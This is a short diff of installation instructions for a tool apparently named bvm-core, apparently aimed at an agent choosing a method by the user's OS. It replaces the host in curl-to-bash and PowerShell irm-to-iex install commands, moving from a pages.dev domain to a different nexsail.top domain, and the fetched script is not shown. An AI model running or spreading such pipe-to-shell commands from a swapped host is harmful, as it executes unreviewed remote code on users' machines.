@@ -46,13 +46,13 @@ Choose the method matching the user's OS:
 **macOS / Linux (recommended):**
 
 ```bash
-curl -fsSL https://bvm-core.pages.dev/install | bash
+curl -fsSL https://bvm-core.nexsail.top/install | bash
 ```
 
 **Windows PowerShell (recommended):**
 
 ```powershell
-irm https://bvm-core.pages.dev/install | iex
+irm https://bvm-core.nexsail.top/install | iex
 ```
 
 **NPM (fallback):**
